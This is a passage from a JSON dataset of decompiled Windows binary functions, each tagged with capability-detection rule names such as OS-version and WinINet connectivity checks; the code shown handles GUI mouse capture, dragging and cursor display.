        "token_count": 105
    },
    "0045bd18": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045bd18(void)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    \n    sub.user32.dll_ReleaseCapture();\n    *0x4a4850 = 0;\n    if ((in_EAX != 0) &&\n       ((cVar2 = fcn.004047cc(),  iVar1 = *0x4a4850,  cVar2 != '\\0' || (iVar1 = in_EAX,  *(in_EAX + 0x30) != 0)))) {\n        *0x4a4850 = iVar1;\n        uVar3 = fcn.00466ca8();\n        sub.user32.dll_SetCapture(uVar3);\n    }\n    return;\n}\n",
        "token_count": 171
    },
    "0045bfe0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0045bfe0(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffc4;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    uStack48 = 0x45c0df;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack52;\n    iVar1 = *param_2;\n    if (iVar1 < 0x216) {\n        if (iVar1 == 0x215) {\n            puStack44 = &stack0xfffffffc;\n            fcn.0045d14c();\n        }\n        else if (iVar1 == 0x200) {\n            var_10h._0_2_ = param_2[2];\n            var_ch = var_10h;\n            var_10h._2_2_ = param_2[2] >> 0x10;\n            var_8h = var_10h._2_2_;\n            in_stack_ffffffc4 = *0x4ab014;\n            puStack44 = &stack0xfffffffc;\n            sub.user32.dll_ClientToScreen(*0x4ab014, &var_ch);\n            fcn.0045cabc();\n        }\n        else if (iVar1 == 0x202) {\n            puStack44 = &stack0xfffffffc;\n            fcn.0045d14c();\n        }\n        else if (iVar1 == 0x205) {\n            if (*(in_EAX + 0x38) == '\\0') {\n                puStack44 = &stack0xfffffffc;\n                fcn.0045d14c();\n            }\n            else {\n                puStack44 = &stack0xfffffffc;\n                fcn.0045d14c();\n            }\n        }\n    }\n    else if (iVar1 == 0xbd00) {\n        if (param_2[1] == 0x11) {\n            fcn.0045cabc();\n        }\n        else if (param_2[1] == 0x1b) {\n            param_2[3] = 1;\n            puStack44 = &stack0xfffffffc;\n            fcn.0045d14c();\n        }\n    }\n    else if ((iVar1 == 0xbd01) && (param_2[1] == 0x11)) {\n        puStack44 = &stack0xfffffffc;\n        fcn.0045cabc();\n    }\n    *in_FS_OFFSET = in_stack_ffffffc4;\n    return;\n}\n",
        "token_count": 644
    },
    "0045c21c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045c21c(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *in_EAX;\n    \n    if (arg_8h == '\\0') {\n        fcn.0040483c();\n    }\n    (**(*in_EAX + 0x24))(arg_ch);\n    return;\n}\n",
        "token_count": 75
    },
    "0045c2b8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.0045c2b8(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.0045c1a8();\n    *(in_EAX + 0x38) = 1;\n    uVar1 = fcn.0042825c();\n    *(in_EAX + 0x48) = uVar1;\n    fcn.0042f10c();\n    fcn.004283d8();\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 229
    },
    "0045c4b0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0045c4b0(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_10h;\n    \n    if (arg_8h == arg_ch[1]) {\n        uVar1 = 0;\n    }\n    else {\n        if (arg_ch[2] == 0) {\n            sub.user32.dll_GetWindowRect(arg_8h, &var_10h);\n            iVar2 = sub.user32.dll_PtInRect(&var_10h, arg_ch[3], arg_ch[4]);\n            if (iVar2 != 0) {\n                arg_ch[2] = arg_8h;\n            }\n        }\n        if (arg_8h == arg_ch[2]) {\n            uVar1 = 0;\n            *(arg_ch + 5) = 1;\n        }\n        else if (arg_8h == *arg_ch) {\n            uVar1 = 0xffffffff;\n            arg_ch[2] = 0;\n        }\n        else {\n            uVar1 = 0xffffffff;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 257
    },
    "0045c51c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuchar __cdecl fcn.0045c51c(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint lprcSrc2;\n    uint lprcSrc1;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t hWnd;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = 1;\n    hWnd = fcn.0045c964();\n    iVar2 = func_0x00408148(hWnd, 4);\n    if (iVar2 != *(**0x4a4f48 + 0x30)) {\n        iVar2 = fcn.0045b9a4();\n        if (iVar2 == 0) {\n            return var_1h;\n        }\n        do {\n            iVar2 = *(iVar2 + 0x30);\n        } while (iVar2 != 0);\n        hWnd = fcn.00466ca8();\n    }\n    if (hWnd != 0) {\n        do {\n            in_EAX = *(in_EAX + 0x30);\n        } while (in_EAX != 0);\n        var_18h = fcn.00466ca8();\n        if (var_18h != hWnd) {\n            iVar2 = *(*(arg_8h + -0x10) + 0x30);\n            if (iVar2 == 0) {\n                cVar1 = fcn.004047cc();\n                if (cVar1 == '\\0') {\n                    var_1ch = 0;\n                }\n                else {\n                    var_1ch = fcn.00466ca8();\n                }\n            }\n            else {\n                do {\n                    iVar2 = *(iVar2 + 0x30);\n                } while (iVar2 != 0);\n                var_1ch = fcn.00466ca8();\n            }\n            var_8h._0_1_ = '\\0';\n            var_10h = *(arg_8h + -9);\n            var_ch = *(arg_8h + -5);\n            uVar3 = sub.kernel32.dll_GetCurrentThreadId_1(fcn.0045c4b0, &var_1ch);\n            sub.user32.dll_EnumThreadWindows(uVar3);\n            if (var_8h != '\\0') {\n                sub.user32.dll_GetWindowRect(hWnd, &lprcSrc1);\n                fcn.0040483c(arg_8h + -1, arg_8h + -9);\n                cVar1 = fcn.004047cc();\n                if ((((cVar1 == '\\0') || (*(*(*0x4ab00c + 0x40) + 0x94) == 0)) ||\n                    (iVar2 = fcn.00466ca8(),  iVar2 != hWnd)) &&\n                   (iVar2 = sub.user32.dll_IntersectRect(&lprcSrc1, &lprcSrc1, &lprcSrc2),  iVar2 != 0)) {\n                    var_1h._0_1_ = 0;\n                }\n            }\n        }\n    }\n    return var_1h;\n}\n",
        "token_count": 748
    },
    "0045c6fc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.0045c6fc(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    uint *in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint lprc;\n    int32_t var_18h;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    uint pt;\n    uint var_5h;\n    uint var_1h;\n    \n    pt = *in_EAX;\n    var_5h = in_EAX[1];\n    var_18h = 0;\n    if (*0x4ab030 != 0) {\n        puVar5 = 0x11;\n        var_10h = param_2;\n        uVar2 = sub.user32.dll_GetKeyState(0x11);\n        if (((uVar2 & 0x8000) != 0) != *(**0x4a4f48 + 0xbc)) {\n            (**(**0x4ab034 + 8))();\n            iVar4 = *(*0x4ab030 + 8);\n            if (-1 < iVar4 + -1) {\n                do {\n                    var_14h = fcn.00419610();\n                    if (((var_14h != var_10h) && (*(var_14h + 0x1da) != '\\0')) &&\n                       (cVar1 = (**(*var_14h + 0x50))(),  cVar1 != '\\0')) {\n                        puVar5 = fcn.00466ca8();\n                        iVar3 = sub.user32.dll_IsWindowVisible();\n                        if (((iVar3 != 0) && (cVar1 = fcn.0045c6b8(&var_1h + 1),  cVar1 == '\\0')) &&\n                           (cVar1 = fcn.0040483c(),  cVar1 != '\\0')) {\n                            var_1h._0_1_ = '\\x01';\n                            puVar5 = &var_1h;\n                            fcn.0040483c();\n                            if (var_1h != '\\0') {\n                                puVar5 = &lprc;\n                                iVar3 = sub.user32.dll_PtInRect();\n                                if (iVar3 != 0) {\n                                    fcn.0045be28();\n                                }\n                            }\n                        }\n                    }\n                    iVar4 = iVar4 + -1;\n                } while (iVar4 != 0);\n            }\n            if (0 < (*0x4ab034)[2]) {\n                var_18h = fcn.0045bee0(puVar5);\n            }\n            if ((var_18h != 0) && (cVar1 = fcn.0045c51c(&var_1h + 1),  cVar1 == '\\0')) {\n                var_18h = 0;\n            }\n        }\n    }\n    return var_18h;\n}\n",
        "token_count": 686
    },
    "0045c850": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045c850(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (in_EAX != 0) {\n        if (*0x4ab030 == 0) {\n            *0x4ab030 = fcn.00404610();\n        }\n        iVar1 = fcn.0041966c();\n        if (param_2 == '\\0') {\n            if (iVar1 != -1) {\n                fcn.00419504();\n            }\n        }\n        else if (iVar1 == -1) {\n            fcn.004194b8();\n        }\n    }\n    return;\n}\n",
        "token_count": 152
    },
    "0045ca1c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0045ca1c(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    var_4h = 0;\n    iVar1 = *(*0x4ab00c + 8);\n    if ((((iVar1 != 0) && (*(iVar1 + 0x1db) != '\\0')) && (*(iVar1 + 0x1ac) != 0)) &&\n       (iVar2 = fcn.0046565c(),  iVar2 != 0)) {\n        iVar2 = fcn.0046565c();\n        if ((iVar2 == 1) && (iVar2 = fcn.00419610(),  iVar2 == *(*0x4ab00c + 0x40))) {\n            return 0;\n        }\n        iVar2 = fcn.0045d4bc();\n        while( true ) {\n            if (iVar2 == 0) {\n                return 0;\n            }\n            if (iVar1 == iVar2) {\n                return 0;\n            }\n            iVar3 = fcn.0041966c();\n            if (iVar3 != -1) break;\n            iVar2 = *(iVar2 + 0x30);\n        }\n        var_4h = fcn.00465670();\n    }\n    return var_4h;\n}\n",
        "token_count": 299
    },
    "0045cabc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045cabc(void)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    char cVar4;\n    uchar uVar5;\n    char cVar6;\n    int32_t *in_EAX;\n    int32_t iVar7;\n    uint uVar8;\n    uint32_t uVar9;\n    int32_t iVar10;\n    int32_t iStack28;\n    int32_t iStack24;\n    \n    if (((*0x4ab028 == '\\0') &&\n        (uVar9 = *0x4ab018 - *in_EAX >> 0x1f,  (*0x4ab018 - *in_EAX ^ uVar9) - uVar9 < *0x4ab024)) &&\n       (uVar9 = *0x4ab01c - in_EAX[1] >> 0x1f,  (*0x4ab01c - in_EAX[1] ^ uVar9) - uVar9 < *0x4ab024)) {\n        return;\n    }\n    iVar10 = 0x45cb17;\n    iVar7 = fcn.0045c990(*0x4ab008);\n    if ((*0x4ab028 == '\\0') && (*0x4ab02c != 0)) {\n        iVar10 = *0x4ab01c;\n        sub.user32.dll_GetDesktopWindow();\n        fcn.00468830(iVar10);\n    }\n    if (*(*0x4ab008 + 0x8f) == '\\0') {\n        *0x4ab028 = '\\x01';\n    }\n    else {\n        *0x4ab028 = '\\x02';\n    }\n    if (iVar7 != (*0x4ab00c)[2]) {\n        fcn.0045c9e0();\n        if (*0x4ab00c == NULL) {\n            return;\n        }\n        (*0x4ab00c)[2] = iVar7;\n        (*0x4ab00c)[3] = iVar10;\n        piVar1 = *0x4ab00c;\n        (*0x4ab00c)[4] = *in_EAX;\n        piVar1[5] = in_EAX[1];\n        fcn.0045c9e0();\n        if (*0x4ab00c == NULL) {\n            return;\n        }\n    }\n    piVar1 = *0x4ab00c;\n    (*0x4ab00c)[4] = *in_EAX;\n    piVar1[5] = in_EAX[1];\n    if ((*0x4ab00c)[2] != 0) {\n        fcn.0045ea84();\n        piVar1 = *0x4ab00c;\n        (*0x4ab00c)[6] = iStack28;\n        piVar1[7] = iStack24;\n    }\n    fcn.0045c9e0(in_EAX[1]);\n    (**(**0x4ab00c + 4))();\n    if (*0x4ab02c != 0) {\n        if (((iVar7 == 0) || ((*(iVar7 + 0x51) & 0x20) != 0)) || (*(*0x4ab00c + 1) != '\\0')) {\n            fcn.0046880c();\n            if (*(*0x4ab02c + 0x6a) == '\\0') {\n                iVar10 = in_EAX[1];\n                sub.user32.dll_GetDesktopWindow();\n                fcn.00468830(iVar10);\n            }\n            else {\n                fcn.0046892c();\n            }\n        }\n        else {\n            fcn.004689a0();\n            uVar8 = fcn.00479e58();\n            sub.user32.dll_SetCursor(uVar8);\n        }\n    }\n    cVar4 = fcn.00479e58();\n    sub.user32.dll_SetCursor();\n    if (*0x4ab028 == '\\x02') {\n        if (iVar7 == 0) {\n            fcn.0040483c(in_EAX[1]);\n        }\n        else {\n            iVar10 = fcn.0045ca1c();\n            (*0x4ab00c)[0x18] = iVar10;\n            if (iVar10 == 0) {\n                uVar5 = fcn.0040483c();\n                *(*0x4ab00c + 0x17) = uVar5;\n            }\n            else {\n                fcn.0045ea84();\n                uVar5 = fcn.0040483c();\n                *(*0x4ab00c + 0x17) = uVar5;\n            }\n        }\n        if ((*0x4ab00c != NULL) && (cVar6 = fcn.00409850(),  cVar6 == '\\0')) {\n            if ((cVar4 != '\\0') && (cVar4 = (**(**0x4ab00c + 0x3c))(),  cVar4 != '\\0')) {\n                (**(**0x4ab00c + 0x34))();\n            }\n            (**(**0x4ab00c + 0x30))();\n            piVar3 = *0x4ab00c;\n            piVar2 = *0x4ab00c + 0x1a;\n            piVar1 = *0x4ab00c + 0x14;\n            (*0x4ab00c)[0x19] = (*0x4ab00c)[0x13];\n            *piVar2 = *piVar1;\n            piVar3[0x1b] = piVar3[0x15];\n            piVar3[0x1c] = piVar3[0x16];\n        }\n    }\n    return;\n}\n",
        "token_count": 1287
    },
    "0045cda4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045cda4(uint param_1, char param_2)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    \n    *0x4ab00c = in_EAX;\n    in_EAX[2] = 0;\n    sub.user32.dll_GetCursorPos(0x4ab018);\n    piVar1 = *0x4ab00c;\n    (*0x4ab00c)[4] = *0x4ab018;\n    piVar1[5] = *0x4ab01c;\n    *0x4ab020 = sub.user32.dll_GetCursor();\n    *0x4ab014 = fcn.0045bf84();\n    *0x4ab024 = param_1;\n    cVar2 = fcn.004047cc();\n    if (cVar2 == '\\0') {\n        if (param_2 == '\\0') {\n            *0x4ab028 = '\\0';\n        }\n        else {\n            *0x4ab028 = '\\x01';\n        }\n    }\n    else {\n        iVar3 = in_EAX[0x13];\n        if (in_EAX[0x15] == iVar3 || in_EAX[0x15] - iVar3 < 0) {\n            in_EAX[10] = 0;\n            in_EAX[0xb] = 0;\n        }\n        else {\n            *(in_EAX + 10) = (in_EAX[4] - iVar3) / (in_EAX[0x15] - in_EAX[0x13]);\n        }\n        iVar3 = in_EAX[0x14];\n        if (in_EAX[0x16] == iVar3 || in_EAX[0x16] - iVar3 < 0) {\n            in_EAX[0xc] = 0;\n            in_EAX[0xd] = 0;\n        }\n        else {\n            *(in_EAX + 0xc) = (in_EAX[5] - iVar3) / (in_EAX[0x16] - in_EAX[0x14]);\n        }\n        if (param_2 == '\\0') {\n            *0x4ab028 = '\\0';\n        }\n        else {\n            *0x4ab028 = '\\x02';\n            (**(*in_EAX + 0x30))();\n        }\n    }\n    *0x4ab02c = (**(**0x4ab00c + 8))();\n    if (*0x4ab02c != 0) {\n        iVar3 = *0x4ab01c;\n        sub.user32.dll_GetDesktopWindow();\n        fcn.00468830(iVar3);\n    }\n    *0x4ab034 = fcn.00404610();\n    if (*0x4ab028 != '\\0') {\n        fcn.0045cabc();\n    }\n    return;\n}\n",
        "token_count": 651
    },
    "0045cf14": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045cf14(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t *in_FS_OFFSET;\n    uint *puStack64;\n    int32_t iStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_20h;\n    uint var_18h;\n    uint var_14h;\n    uint lpPoint;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack52 = &stack0xfffffffc;\n    uStack56 = 0x45d0b9;\n    iStack60 = *in_FS_OFFSET;\n    *0x4ab008 = in_EAX;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    var_8h = 0;\n    *0x4ab010 = 0;\n    if (*(in_EAX + 0x8f) == '\\0') {\n        puStack64 = 0x45cf5b;\n        puStack52 = &stack0xfffffffc;\n        fcn.0040483c();\n        if (*0x4ab008 == 0) {\n            *in_FS_OFFSET = iStack60;\n            return;\n        }\n        if (var_8h == 0) {\n            puStack64 = 0x45cf89;\n            var_8h = fcn.0045c1a8();\n            *0x4ab010 = 1;\n        }\n    }\n    else {\n        fcn.0040483c();\n        if (*0x4ab008 == 0) {\n            *in_FS_OFFSET = iStack60;\n            return;\n        }\n        if (var_8h == 0) {\n            var_8h = fcn.0045c2b8();\n            *0x4ab010 = 1;\n        }\n        cVar1 = fcn.004047cc();\n        if (cVar1 == '\\0') {\n            if ((*(*(var_8h + 0x40) + 0x30) == 0) && (cVar1 = fcn.004047cc(),  cVar1 == '\\0')) {\n                puStack64 = &fcn.0045cf14::lpPoint;\n                sub.user32.dll_GetCursorPos();\n                *(var_8h + 0x4c) = lpPoint;\n                *(var_8h + 0x50) = var_ch;\n            }\n            else {\n                fcn.00418198();\n                puStack64 = 0x45d05a;\n                fcn.0045e9d4();\n                *(var_8h + 0x4c) = var_18h;\n                *(var_8h + 0x50) = var_14h;\n            }\n            fcn.00418198();\n            *(var_8h + 0x54) = var_18h;\n            *(var_8h + 0x58) = var_14h;\n        }\n        else {\n            puStack64 = var_8h + 0x4c;\n            uVar2 = fcn.00466ca8();\n            sub.user32.dll_GetWindowRect(uVar2);\n        }\n        *(var_8h + 100) = *(var_8h + 0x4c);\n        *(var_8h + 0x68) = *(var_8h + 0x50);\n        *(var_8h + 0x6c) = *(var_8h + 0x54);\n        *(var_8h + 0x70) = *(var_8h + 0x58);\n    }\n    fcn.0045cda4();\n    *in_FS_OFFSET = puStack64;\n    return;\n}\n",
        "token_count": 829
    },
    "0045d0d8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0045d0d8(int32_t arg_8h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint32_t unaff_EBX;\n    \n    uVar2 = unaff_EBX & 0xffffff00 | *(*0x4ab00c + 8) != 0;\n    if ((*(arg_8h + -1) != '\\0') && (*0x4ab028 == '\\x02')) {\n        cVar1 = (**(**0x4ab008 + 0x54))();\n        if ((cVar1 == '\\0') && ((*0x4ab008)[0x25] != 0)) {\n            if ((*0x4ab008)[0x25] != 0) {\n                uVar2 = fcn.0040483c();\n            }\n        }\n        else {\n            uVar2 = CONCAT31((unaff_EBX & 0xffffff00) >> 8, 1);\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 227
    },
    "0045d14c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0045d14c(void)\n\n{\n    uint *puVar1;\n    char in_AL;\n    char cVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    uint *in_FS_OFFSET;\n    uint *arg_8h;\n    uint uStack64;\n    uint uStack60;\n    uint32_t uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_11h;\n    uint var_dh;\n    uint var_9h;\n    uint var_1h;\n    \n    puStack32 = &fcn.0045d14c::var_1h + 1;\n    puStack44 = &fcn.0045d14c::var_1h + 1;\n    piVar5 = NULL;\n    if ((*0x4ab00c == NULL) || (*(*0x4ab00c + 5) != '\\0')) {\n        return;\n    }\n    uStack36 = 0x45d461;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    *0x4ab038 = *0x4ab00c;\n    uStack48 = 0x45d3ef;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    *(*0x4ab00c + 5) = 1;\n    *(*0x4ab00c + 8) = in_AL;\n    var_1h._0_1_ = in_AL;\n    fcn.0045bfcc();\n    if (*0x4ab028 == '\\x02') {\n        piVar5 = fcn.004047f0();\n        (**(*piVar5 + 0x34))();\n        *(piVar5 + 0x1d) = piVar5[2] == 0;\n    }\n    if ((*0x4ab00c)[2] == 0) {\ncode_r0x0045d224:\n        var_dh = (*0x4ab00c)[5];\n    }\n    else {\n        cVar2 = fcn.004047cc();\n        if (cVar2 == '\\0') goto code_r0x0045d224;\n        var_dh = (*0x4ab00c)[7];\n    }\n    uStack60 = 0x45d23b;\n    cVar2 = fcn.0045d0d8(&fcn.0045d14c::var_1h + 1);\n    if (cVar2 != '\\0') {\n        if ((*0x4ab028 == '\\x02') && (*(piVar5 + 0x1d) != '\\0')) {\ncode_r0x0045d263:\n            if (var_1h != '\\0') {\n                uVar3 = 1;\n                goto code_r0x0045d26f;\n            }\n        }\n        else if (*0x4ab028 != '\\0') {\n            cVar2 = fcn.0045c9e0();\n            if (cVar2 != '\\0') goto code_r0x0045d263;\n        }\n    }\n    uVar3 = 0;\ncode_r0x0045d26f:\n    if (*0x4ab028 == '\\x02') {\n        if ((uVar3 != 0) && (*(piVar5 + 0x1d) != '\\0')) {\n            iVar4 = fcn.00471968();\n            if ((iVar4 != 0) && (*(iVar4 + 0x268) == piVar5[0x10])) {\n                fcn.004766a8();\n            }\n            uStack60 = 0x45d2be;\n            fcn.004601fc(*0x4ab00c);\n        }\n    }\n    else if (*0x4ab02c == 0) {\n        uStack60 = 0x45d2e0;\n        sub.user32.dll_SetCursor();\n    }\n    else {\n        fcn.004689a0();\n    }\n    *0x4ab008 = 0;\n    *0x4ab00c = NULL;\n    if ((*0x4ab038 != NULL) && ((*0x4ab038)[2] != 0)) {\n        if (uVar3 == 0) {\n            (*0x4ab038)[4] = 0;\n            (*0x4ab038)[5] = 0;\n        }\n        puVar1 = *0x4ab038;\n        uStack60 = 0x45d393;\n        uStack64 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffc0;\n        arg_8h = *0x4ab038 + 4;\n        fcn.0045c8ac(arg_8h, (*0x4ab038)[2]);\n        *in_FS_OFFSET = arg_8h;\n        if (*0x4ab038 == NULL) {\n            *0x4ab038 = puVar1;\n        }\n        return;\n    }\n    *in_FS_OFFSET = uStack52;\n    puStack44 = 0x45d3f6;\n    uStack48 = 0x45d3b1;\n    fcn.00404640();\n    *0x4ab034 = 0;\n    if (*0x4ab038 != NULL) {\n        *(*0x4ab038 + 5) = 0;\n        uStack48 = var_dh;\n        uStack52 = uVar3;\n        (****0x4ab038)();\n    }\n    *0x4ab00c = NULL;\n    return;\n}\n",
        "token_count": 1286
    },
    "0045d470": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045d470(void)\n\n{\n    if (*0x4ab00c != 0) {\n        fcn.0045d14c();\n    }\n    *0x4ab008 = 0;\n    return;\n}\n",
        "token_count": 53
    },
    "0045d508": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045d508(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if (*in_EAX == 0) {\n        iVar1 = fcn.00404610();\n        *in_EAX = iVar1;\n    }\n    fcn.004194b8();\n    return;\n}\n",
        "token_count": 75
    },
    "0045d530": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045d530(void)\n\n{\n    int32_t *in_EAX;\n    \n    fcn.00419754();\n    if (*(*in_EAX + 8) == 0) {\n        fcn.00404640();\n        *in_EAX = 0;\n    }\n    return;\n}\n",
        "token_count": 69
    },
    "0045d63c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
